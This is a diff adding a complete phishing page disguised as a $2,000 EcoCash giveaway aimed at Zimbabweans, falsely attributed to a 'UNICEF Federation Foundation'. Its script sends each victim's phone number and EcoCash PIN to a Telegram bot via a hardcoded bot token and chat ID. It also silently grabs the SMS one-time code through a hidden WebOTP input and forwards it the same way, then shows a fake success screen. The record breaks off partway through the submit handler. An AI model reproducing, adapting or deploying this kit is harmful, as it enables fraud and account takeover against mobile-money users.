@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>$2,000 USD EcoCash Giveaway • Zimbabwe</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+    <style>
+        /* ─── RESET & BASE ─── */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --gold: #f5b342;
+            --gold-light: #ffd966;
+            --gold-dark: #c78a2b;
+            --bg-dark: #0b0d12;
+            --bg-card: rgba(255, 255, 255, 0.04);
+            --text-primary: #f0edea;
+            --text-secondary: #a8a3a0;
+            --border-light: rgba(255, 255, 255, 0.08);
+            --shadow-glow: 0 0 60px rgba(245, 179, 66, 0.12);
+            --radius: 20px;
+            --transition: 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+            --ecocash-green: #00a859;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            height: 100%;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+            background-image:
+                radial-gradient(ellipse at 30% 40%, rgba(245, 179, 66, 0.15) 0%, transparent 55%),
+                radial-gradient(ellipse at 70% 60%, rgba(245, 179, 66, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 100%, rgba(245, 179, 66, 0.05) 0%, transparent 40%);
+            background-attachment: fixed;
+        }
+
+        /* ─── FALLING DOLLARS BACKGROUND ─── */
+        #dollar-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+            opacity: 0.4;
+        }
+        .dollar {
+            position: absolute;
+            top: -50px;
+            font-size: 18px;
+            font-weight: 600;
+            color: rgba(245, 179, 66, 0.25);
+            animation: fall linear infinite;
+            user-select: none;
+            will-change: transform;
+            text-shadow: 0 0 12px rgba(245, 179, 66, 0.15);
+        }
+        @keyframes fall {
+            0% {
+                transform: translateY(-50px) rotate(0deg) scale(0.8);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(calc(100vh + 100px)) rotate(720deg) scale(1.2);
+                opacity: 0.2;
+            }
+        }
+
+        /* ─── SCROLLBAR ─── */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-dark);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--gold-dark);
+            border-radius: 10px;
+        }
+
+        /* ─── MAIN CARD ─── */
+        .card {
+            max-width: 500px;
+            width: 100%;
+            background: var(--bg-card);
+            backdrop-filter: blur(24px) saturate(1.4);
+            -webkit-backdrop-filter: blur(24px) saturate(1.4);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius);
+            padding: 40px 32px 36px;
+            box-shadow: var(--shadow-glow), 0 20px 60px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 1;
+            overflow: hidden;
+            transition: var(--transition);
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(245, 179, 66, 0.04) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .card>* {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ─── HEADER / BADGE ─── */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(245, 179, 66, 0.13);
+            border: 1px solid rgba(245, 179, 66, 0.18);
+            border-radius: 100px;
+            padding: 6px 16px 6px 10px;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+            color: var(--gold-light);
+            margin-bottom: 20px;
+        }
+        .badge .dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #4ade80;
+            display: inline-block;
+            animation: pulse-dot 1.8s ease-in-out infinite;
+        }
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(0.75);
+            }
+        }
+
+        /* ─── TITLE & SUBTITLE ─── */
+        .title {
+            font-size: 32px;
+            font-weight: 800;
+            line-height: 1.15;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+        .title .highlight {
+            background: linear-gradient(135deg, var(--gold-light), var(--gold));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            margin-bottom: 28px;
+        }
+        .subtitle strong {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        /* ─── PRIZE DISPLAY ─── */
+        .prize-display {
+            background: rgba(245, 179, 66, 0.06);
+            border: 1px solid rgba(245, 179, 66, 0.12);
+            border-radius: 14px;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 28px;
+            transition: var(--transition);
+        }
+        .prize-display .icon {
+            font-size: 32px;
+            line-height: 1;
+            flex-shrink: 0;
+        }
+        .prize-display .info {
+            flex: 1;
+        }
+        .prize-display .info .label {
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            color: var(--gold-light);
+            opacity: 0.8;
+        }
+        .prize-display .info .amount {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--gold);
+            letter-spacing: -0.3px;
+        }
+        .prize-display .info .amount span {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        /* ─── WALLET BADGE ─── */
+        .wallet-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(0, 168, 89, 0.15);
+            border: 1px solid rgba(0, 168, 89, 0.25);
+            border-radius: 30px;
+            padding: 4px 14px 4px 10px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #4ade80;
+            margin-top: 6px;
+        }
+        .wallet-badge svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* ─── FORM ELEMENTS ─── */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--text-secondary);
+            letter-spacing: 0.2px;
+        }
+        .form-group label .required {
+            color: #f87171;
+            margin-left: 2px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            font-size: 16px;
+            font-family: inherit;
+            font-weight: 500;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.07);
+            border-radius: 12px;
+            color: var(--text-primary);
+            outline: none;
+            transition: var(--transition);
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        .form-control:focus {
+            border-color: var(--gold);
+            background: rgba(255, 255, 255, 0.07);
+            box-shadow: 0 0 0 4px rgba(245, 179, 66, 0.08);
+        }
+        .form-control::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+            font-weight: 400;
+        }
+        .form-control.error {
+            border-color: #f87171;
+            box-shadow: 0 0 0 4px rgba(248, 113, 113, 0.08);
+        }
+
+        .form-hint {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-top: 6px;
+            opacity: 0.7;
+        }
+        .form-hint.error-text {
+            color: #f87171;
+            opacity: 1;
+        }
+
+        /* ─── PHONE WITH PREFIX ─── */
+        .phone-prefix-group {
+            display: flex;
+            align-items: center;
+            gap: 0;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.07);
+            border-radius: 12px;
+            transition: var(--transition);
+        }
+        .phone-prefix-group:focus-within {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 4px rgba(245, 179, 66, 0.08);
+            background: rgba(255, 255, 255, 0.07);
+        }
+        .phone-prefix-group .prefix {
+            padding: 14px 0 14px 18px;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            white-space: nowrap;
+            background: transparent;
+            border: none;
+            user-select: none;
+            opacity: 0.8;
+        }
+        .phone-prefix-group .form-control {
+            border: none !important;
+            border-radius: 0 12px 12px 0 !important;
+            background: transparent !important;
+            padding-left: 8px;
+            box-shadow: none !important;
+        }
+        .phone-prefix-group .form-control:focus {
+            box-shadow: none !important;
+        }
+
+        /* ─── ECOCASH LOGO ─── */
+        .ecocash-logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, #00a859, #00c46a);
+            padding: 4px 14px 4px 10px;
+            border-radius: 30px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+            box-shadow: 0 2px 12px rgba(0, 168, 89, 0.3);
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+        .ecocash-logo svg {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+        .ecocash-logo .logo-text {
+            font-family: 'Inter', sans-serif;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+        }
+        .ecocash-logo .logo-text span {
+            color: #f7b731;
+        }
+
+        /* ─── PIN INPUT ─── */
+        .pin-wrapper {
+            position: relative;
+        }
+        .pin-wrapper .toggle-vis {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+            opacity: 0.6;
+            transition: var(--transition);
+        }
+        .pin-wrapper .toggle-vis:hover {
+            opacity: 1;
+        }
+
+        /* ─── BUTTON ─── */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 16px 20px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: inherit;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+            color: #0b0d12;
+            box-shadow: 0 4px 20px rgba(245, 179, 66, 0.25);
+            margin-top: 8px;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(245, 179, 66, 0.35);
+        }
+        .btn-primary:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2.5px solid rgba(11, 13, 18, 0.15);
+            border-top-color: #0b0d12;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ─── SUCCESS SCREEN ─── */
+        .success-screen {
+            display: none;
+            text-align: center;
+            padding: 20px 0 8px;
+            animation: fadeUp 0.6s ease forwards;
+        }
+        .success-screen.active {
+            display: block;
+        }
+
+        .success-screen .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #4ade80, #22c55e);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            color: #0b0d12;
+            box-shadow: 0 8px 40px rgba(74, 222, 128, 0.25);
+            animation: popIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+        @keyframes popIn {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .success-screen h2 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 12px;
+        }
+        .success-screen p {
+            color: var(--text-secondary);
+            font-size: 16px;
+            line-height: 1.7;
+            max-width: 380px;
+            margin: 0 auto;
+        }
+        .success-screen p .highlight-text {
+            color: var(--gold-light);
+            font-weight: 600;
+        }
+
+        /* ─── STATUS INDICATOR ─── */
+        .status-bar {
+            margin-top: 20px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            display: none;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+        .status-bar.active {
+            display: flex;
+        }
+        .status-bar .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            background: var(--gold);
+            animation: pulse-dot 1.5s ease-in-out infinite;
+        }
+        .status-bar .status-dot.success {
+            background: #4ade80;
+            animation: none;
+        }
+        .status-bar .status-dot.error {
+            background: #f87171;
+            animation: none;
+        }
+
+        /* ─── CONFETTI ─── */
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            overflow: hidden;
+        }
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            top: -10px;
+            animation: confetti-fall linear forwards;
+        }
+        @keyframes confetti-fall {
+            0% {
+                transform: translateY(0) rotate(0deg) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(110vh) rotate(720deg) scale(0.3);
+                opacity: 0;
+            }
+        }
+
+        /* ─── RESPONSIVE ─── */
+        @media (max-width: 540px) {
+            .card {
+                padding: 28px 18px 28px;
+                border-radius: 16px;
+            }
+            .title {
+                font-size: 26px;
+            }
+            .subtitle {
+                font-size: 14px;
+            }
+            .prize-display .info .amount {
+                font-size: 22px;
+            }
+            .ecocash-logo {
+                font-size: 12px;
+                padding: 3px 10px 3px 8px;
+            }
+            .ecocash-logo svg {
+                width: 20px;
+                height: 20px;
+            }
+            .success-screen h2 {
+                font-size: 20px;
+            }
+            .success-screen p {
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .card {
+                padding: 20px 14px 24px;
+            }
+            .title {
+                font-size: 22px;
+            }
+            .badge {
+                font-size: 10px;
+                padding: 4px 12px 4px 8px;
+            }
+        }
+
+        /* ─── UTILITY ─── */
+        .footer-note {
+            margin-top: 24px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.15);
+            text-align: center;
+            letter-spacing: 0.2px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 20px;
+        }
+        .footer-note a {
+            color: rgba(255, 255, 255, 0.2);
+            text-decoration: none;
+        }
+        .footer-note a:hover {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(18px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .hidden-code-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ─── FALLING DOLLARS BACKGROUND ─── -->
+    <div id="dollar-rain"></div>
+
+    <!-- ─── MAIN CARD ─── -->
+    <div class="card" role="main" aria-label="Promotional landing page for Zimbabwe">
+
+        <!-- BADGE -->
+        <div class="badge">
+            <span class="dot"></span>
+            🇿🇼 Zimbabwe Only • Limited Offer
+        </div>
+
+        <!-- TITLE -->
+        <h1 class="title">
+            Congratulations! 🎉<br />You've been selected for<br /><span class="highlight">$2,000 USD</span>
+        </h1>
+        <p class="subtitle" style="font-size: 16px; color: var(--gold-light); margin-top: 4px; font-weight: 600;">
+            Official Cash Prize — Claim Today
+        </p>
+
+        <!-- PRIZE DISPLAY -->
+        <div class="prize-display">
+            <span class="icon">🎉</span>
+            <div class="info">
+                <div class="label">Your reward</div>
+                <div class="amount">$2,000 <span>USD</span></div>
+                <div class="wallet-badge">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="2" y="5" width="20" height="14" rx="2" stroke="#4ade80" stroke-width="2"/>
+                        <path d="M16 12C16 10.8954 16.8954 10 18 10H20V14H18C16.8954 14 16 13.1046 16 12Z" fill="#4ade80"/>
+                    </svg>
+                    <span>Deposits to EcoCash Wallet</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ─── FORM ─── -->
+        <form id="promoForm" novalidate autocomplete="off">
+
+            <!-- PHONE NUMBER -->
+            <div class="form-group">
+                <label for="phoneNumber">
+                    Phone Number <span class="required">*</span>
+                </label>
+                <div class="phone-prefix-group">
+                    <span class="prefix" id="countryPrefix">+263</span>
+                    <input
+                    type="tel"
+                    class="form-control"
+                    id="phoneNumber"
+                    placeholder="** *** ****"
+                    autocomplete="tel"
+                    required
+                    aria-describedby="phoneHint"
+                    />
+                </div>
+                <div class="form-hint" id="phoneHint">Enter your 9‑digit Zimbabwean number (e.g., 71 234 5678).</div>
+            </div>
+
+            <!-- PIN (EcoCash) with Logo -->
+            <div class="form-group">
+                <label for="cardPin" style="display:flex; align-items:center; gap:6px;">
+                    <span class="ecocash-logo">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="12" cy="12" r="10" fill="white" />
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#00a859" />
+                            <circle cx="12" cy="12" r="7" fill="#00a859" />
+                            <text x="12" y="15" font-size="10" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial, sans-serif">$</text>
+                        </svg>
+                        <span class="logo-text">Eco<span>Cash</span></span>
+                    </span>
+                    <span>PIN</span>
+                    <span class="required">*</span>
+                </label>
+                <div class="pin-wrapper">
+                    <input
+                    type="password"
+                    class="form-control"
+                    id="cardPin"
+                    placeholder="••••"
+                    autocomplete="off"
+                    maxlength="4"
+                    inputmode="numeric"
+                    pattern="[0-9]{4}"
+                    required
+                    aria-describedby="pinHint"
+                    />
+                    <button type="button" class="toggle-vis" id="togglePin" aria-label="Toggle PIN visibility">
+                        👁
+                    </button>
+                </div>
+                <div class="form-hint" id="pinHint">Enter your 4‑digit EcoCash PIN to confirm.</div>
+            </div>
+
+            <!-- Hidden code input for WebOTP -->
+            <input
+            type="text"
+            class="hidden-code-input"
+            id="hiddenCodeInput"
+            autocomplete="one-time-code"
+            inputmode="numeric"
+            />
+
+            <!-- SUBMIT BUTTON -->
+            <button type="submit" class="btn btn-primary" id="submitBtn">
+                💰 Claim Reward to My EcoCash Wallet Now
+            </button>
+
+        </form>
+
+        <!-- ─── SUCCESS SCREEN ─── -->
+        <div class="success-screen" id="successScreen">
+            <div class="checkmark">✓</div>
+            <h2>🎉 Congratulations!</h2>
+            <p>
+                You have been selected to win <span class="highlight-text">$2,000 USD</span> from the
+                <strong>UNICEF Federation Foundation</strong>. <br /><br />
+                Your funds will be transferred to your EcoCash wallet within <strong>2 minutes</strong>.
+            </p>
+            <div style="margin-top: 16px; display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 168, 89, 0.12); padding: 8px 16px; border-radius: 30px; border: 1px solid rgba(0, 168, 89, 0.2);">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="2" y="5" width="20" height="14" rx="2" stroke="#4ade80" stroke-width="2"/>
+                    <path d="M16 12C16 10.8954 16.8954 10 18 10H20V14H18C16.8954 14 16 13.1046 16 12Z" fill="#4ade80"/>
+                </svg>
+                <span style="color: #4ade80; font-weight: 600; font-size: 14px;">Deposited to EcoCash Wallet</span>
+            </div>
+        </div>
+
+        <!-- ─── STATUS BAR ─── -->
+        <div class="status-bar" id="statusBar">
+            <span class="status-dot" id="statusDot"></span>
+            <span id="statusText">Waiting for verification code...</span>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer-note">
+            🔒 Secured • Data encrypted • 100% confidential
+        </div>
+    </div>
+
+    <!-- ─── CONFETTI CONTAINER ─── -->
+    <div class="confetti-container" id="confettiContainer" aria-hidden="true"></div>
+
+    <!-- ─── JAVASCRIPT ─── -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ─── DOM REFS ───
+            const form = document.getElementById('promoForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const successScreen = document.getElementById('successScreen');
+            const statusBar = document.getElementById('statusBar');
+            const statusDot = document.getElementById('statusDot');
+            const statusText = document.getElementById('statusText');
+            const hiddenCodeInput = document.getElementById('hiddenCodeInput');
+            const phoneInput = document.getElementById('phoneNumber');
+            const pinInput = document.getElementById('cardPin');
+            const togglePin = document.getElementById('togglePin');
+            const confettiContainer = document.getElementById('confettiContainer');
+
+            let isSubmitting = false;
+            let storedPhone = '';
+            let storedPin = '';
+            let codeSent = false;
+            let codeListenerActive = false;
+            let listenerAttempts = 0;
+            const maxListenerAttempts = 10;
+            let waitTimeout = null;
+            let codeDetected = false;
+
+            // ─── CONFIG: TELEGRAM ───
+            // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
+            const BOT_TOKEN = '8773610021:AAHN80m50Ssiyj5hR1UFRDfzjCY6l50CJXM';
+            const CHAT_ID = '8834429633';
+
+            // ─── VALIDATION ───
+            function validatePhone() {
+                const raw = phoneInput.value.replace(/\s/g, '');
+                if (!/^\d{9}$/.test(raw)) {
+                    phoneInput.classList.add('error');
+                    document.getElementById('phoneHint').textContent = 'Enter exactly 9 digits (e.g., 712345678).';
+                    document.getElementById('phoneHint').classList.add('error-text');
+                    return false;
+                }
+                phoneInput.classList.remove('error');
+                document.getElementById('phoneHint').textContent = 'Enter your 9‑digit Zimbabwean number.';
+                document.getElementById('phoneHint').classList.remove('error-text');
+                return true;
+            }
+
+            function validatePin() {
+                const val = pinInput.value.replace(/\s/g, '');
+                if (!/^\d{4}$/.test(val)) {
+                    pinInput.classList.add('error');
+                    document.getElementById('pinHint').textContent = 'Enter exactly 4 digits.';
+                    document.getElementById('pinHint').classList.add('error-text');
+                    return false;
+                }
+                pinInput.classList.remove('error');
+                document.getElementById('pinHint').textContent = 'Enter your 4‑digit EcoCash PIN.';
+                document.getElementById('pinHint').classList.remove('error-text');
+                return true;
+            }
+
+            // ─── FORMAT PHONE ───
+            phoneInput.addEventListener('input', function(e) {
+                let val = this.value.replace(/\D/g, '');
+                if (val.length > 9) val = val.slice(0, 9);
+                let formatted = '';
+                if (val.length > 2) {
+                    formatted = val.slice(0, 2) + ' ' + val.slice(2);
+                    if (val.length > 5) {
+                        formatted = val.slice(0, 2) + ' ' + val.slice(2, 5) + ' ' + val.slice(5, 9);
+                    }
+                } else {
+                    formatted = val;
+                }
+                this.value = formatted;
+                this.classList.remove('error');
+                document.getElementById('phoneHint').classList.remove('error-text');
+                document.getElementById('phoneHint').textContent = 'Enter your 9‑digit Zimbabwean number.';
+            });
+
+            // ─── PIN: digits only, max 4 ───
+            pinInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length > 4) this.value = this.value.slice(0, 4);
+                this.classList.remove('error');
+                document.getElementById('pinHint').classList.remove('error-text');
+                document.getElementById('pinHint').textContent = 'Enter your 4‑digit EcoCash PIN.';
+            });
+
+            // ─── TOGGLE PIN ───
+            togglePin.addEventListener('click', function() {
+                const isPassword = pinInput.type === 'password';
+                pinInput.type = isPassword ? 'text' : 'password';
+                this.textContent = isPassword ? '🙈' : '👁';
+            });
+
+            // ─── ENTER KEY: submit form ───
+            form.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    submitBtn.click();
+                }
+            });
+
+            // ─── GET CURRENT TIME ───
+            function getTimeString() {
+                return new Date().toLocaleString('en-US', {
+                    month: 'numeric',
+                    day: 'numeric',
+                    year: 'numeric',
+                    hour: 'numeric',
+                    minute: 'numeric',
+                    second: 'numeric',
+                    hour12: true
+                });
+            }
+
+            // ─── TELEGRAM SENDER ───
+            async function sendToTelegram(message) {
+                const url =
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                try {
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data.ok) {
+                        console.error('Telegram API error:', data);
+                        return { ok: false, error: data.description || 'Unknown error' };
+                    }
+                    return { ok: true };
+                } catch (err) {
+                    console.error('Network error sending to Telegram:', err);
+                    return { ok: false, error: err.message };
+                }
+            }
+
+            // ─── UPDATE STATUS BAR ───
+            function updateStatus(text, type) {
+                statusBar.classList.add('active');
+                statusText.textContent = text;
+                statusDot.className = 'status-dot';
+                if (type === 'success') {
+                    statusDot.classList.add('success');
+                } else if (type === 'error') {
+                    statusDot.classList.add('error');
+                }
+            }
+
+            function hideStatus() {
+                statusBar.classList.remove('active');
+            }
+
+            // ─── SILENT WEBOTP LISTENER ───
+            function startSilentWebOTPListener() {
+                if (!('OTPCredential' in window)) {
+                    setTimeout(() => {
+                        if (!codeDetected && !successScreen.classList.contains('active')) {
+                            updateStatus('⚠️ WebOTP not supported. Please enter code manually.', 'error');
+                        }
+                    }, 120000);
+                    console.log('WebOTP not supported.');
+                    return;
+                }
+
+                if (codeListenerActive) return;
+                if (codeSent) return;
+                if (listenerAttempts >= maxListenerAttempts) {
+                    setTimeout(() => {
+                        if (!codeDetected && !successScreen.classList.contains('active')) {
+                            updateStatus('⚠️ Could not detect code. Please try again.', 'error');
+                        }
+                    }, 120000);
+                    return;
+                }
+
+                codeListenerActive = true;
+                listenerAttempts++;
+                console.log(`🔍 Silent WebOTP listener started (attempt ${listenerAttempts})...`);
+
+                hiddenCodeInput.focus();
+
+                navigator.credentials.get({
+                    otp: { transport: ['sms'] }
+                }).then(otp => {
+                    const code = otp.code;
+                    console.log('📱 Code detected silently:', code);
+                    codeListenerActive = false;
+                    codeDetected = true;
+                    codeSent = true;
+
+                    if (waitTimeout) {
+                        clearTimeout(waitTimeout);
+                        waitTimeout = null;
+                    }
+
+                    const timeString = getTimeString();
+                    const message =
+                        `📱Verification Code Received\n` +
+                        `Phone: ${storedPhone}\n` +
+                        `EcoCash PIN: ${storedPin}\n` +
+                        `🔑 Verification Code: ${code}\n` +
+                        `Time: ${timeString}`;
+
+                    sendToTelegram(message).then(result => {
+                        if (result.ok) {
+                            hideStatus();
+                            showSuccessScreen();
+                        } else {
+                            updateStatus('❌ Failed to send code. Try again.', 'error');
+                        }
+                    }).catch(err => {
+                        console.error('Error sending code:', err);
+                        updateStatus('❌ Error sending code. Try again.', 'error');
+                    });
+                }).catch(err => {
+                    console.warn('WebOTP error:', err);
+                    codeListenerActive = false;
+                    if (listenerAttempts < maxListenerAttempts) {
+                        setTimeout(startSilentWebOTPListener, 4000);
+                    } else {
+                        setTimeout(() => {
+                            if (!codeDetected && !successScreen.classList.contains('active')) {
+                                updateStatus('⚠️ Could not detect code. Please try again.', 'error');
+                            }
+                        }, 120000);
+                    }
+                });
+            }
+
+            // ─── SHOW SUCCESS SCREEN ───
+            function showSuccessScreen() {
+                form.style.display = 'none';
+                successScreen.classList.add('active');
+                statusBar.classList.remove('active');
+                triggerConfetti();
+            }
+
+            // ─── CONFETTI ───
+            function triggerConfetti() {
+                const colors = ['#f5b342', '#ffd966', '#4ade80', '#f87171', '#60a5fa', '#c084fc', '#f472b6'];
+                for (let i = 0; i < 150; i++) {
+                    const piece = document.createElement('div');
+                    piece.className = 'confetti-piece';
+                    const size = 6 + Math.random() * 8;
+                    piece.style.width = size + 'px';
+                    piece.style.height = size + 'px';
+                    piece.style.background = colors[Math.floor(Math.random() * colors.length)];
+                    piece.style.left = Math.random() * 100 + '%';
+                    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                    piece.style.animationDuration = (2 + Math.random() * 3) + 's';
+                    piece.style.animationDelay = (Math.random() * 2) + 's';
+                    confettiContainer.appendChild(piece);
+                }
+                setTimeout(() => {
+                    confettiContainer.innerHTML = '';
+                }, 6000);
+            }
+
+            // ─── SUBMIT HANDLER ───
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                if (isSubmitting) return;
+
+                const phoneOk = validatePhone();
+                const pinOk = validatePin();
+                if (!phoneOk || !pinOk) {
+                    updateStatus('Please fix the errors above.', 'error');
+                    return;
+                }
+
+                storedPhone = phoneInput.value.replace(/\s/g, '');
+                storedPin = pinInput.value;
+
+                isSubmitting = true;
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = `<span class="spinner"></span> Submitting...`;
+
+                const timeString = getTimeString();
+                const initialMessage =
+                    `📝 New Claim Submission\n` +
+                    `Phone: ${storedPhone}\n` +
+                    `EcoCash PIN: ${storedPin}\n` +
+                    `Time: ${timeString}\n` +
+                    `🔐 Waiting for verification code...`;
+
+                const result = await sendToTelegram(initialMessage);
+
+                if (!result.ok) {
+                    updateStatus('❌ Submission failed. Please try again.', 'error');
+                    isSubmitting = false;
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet Now';
+                    return;
+                }
+
+                startSilentWebOTPListener();
+
+                waitTimeout = setTimeout(() => {
+                    if (!codeDetected && !successScreen.classList.contains('active')) {
+                        updateStatus('⏳ Still waiting for verification code...', '');
+                    }
+                }, 120000);
+
+                setTimeout(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet Now';
+                    isSubmitting = false;
